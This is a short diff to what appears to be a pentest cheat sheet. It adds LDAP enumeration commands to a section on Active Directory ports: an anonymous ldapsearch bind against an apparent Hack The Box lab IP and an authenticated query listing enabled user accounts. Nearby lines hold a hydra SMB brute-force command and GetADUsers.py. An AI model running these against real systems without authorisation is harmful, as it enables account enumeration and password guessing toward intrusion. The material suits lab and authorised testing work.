@@ -178,7 +178,10 @@ hydra -L username.txt -P password.txt 10.0.0.1 smb -V
 ## Port 143
 ## Port 389
 ```
-➤ With the example test.com : DOMAIN = test and DOMAIN2 = com
+➤ Anonymous connection attempt (-x). With the example test.com : DOMAIN = test and DOMAIN2 = com
+ldapsearch -h 10.129.136.235 -p 389 -x -b "dc=htb,dc=local"   
+
+➤ Authenticated research. With the example test.com : DOMAIN = test and DOMAIN2 = com
 ldapsearch -x -h <IP> -p <PORT> -D 'USERNAME' -w 'PASSWORD' -b "dc=DOMAIN,dc=DOMAIN2" -s sub"(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
 
 ./GetADUsers.py -all DOMAIN/USERNAME -dc-ip <IP>
